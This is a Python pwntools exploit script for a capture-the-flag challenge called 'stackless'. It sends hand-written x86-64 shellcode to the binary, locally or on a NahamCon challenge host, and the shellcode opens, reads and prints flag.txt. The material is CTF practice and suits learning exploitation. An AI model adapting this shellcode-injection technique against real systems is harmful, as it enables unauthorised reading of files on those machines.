#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./stackless', checksec=False) 

if args.REMOTE:
	p = remote('challenge.nahamcon.com', 30375)
else:
	p = process(binary.path) 

shellcode = asm(f'''
lea rdi, [rip+flag]
mov rax, {constants.SYS_open}
syscall

mov rdi, rax
mov rsi, qword ptr fs:0
mov rdx, 100
mov rax, {constants.SYS_read}
syscall

mov rdx, rax
mov rdi, {constants.STDOUT_FILENO}
mov rax, {constants.SYS_write}
syscall
hlt

flag: .asciz "flag.txt"
''')

if not args.REMOTE: print(disasm(shellcode))

p.sendlineafter(b'length\n', str(len(shellcode)).encode())
p.sendlineafter(b'code\n', shellcode)
flag = p.recvline().strip().decode()
p.close()
print(flag)

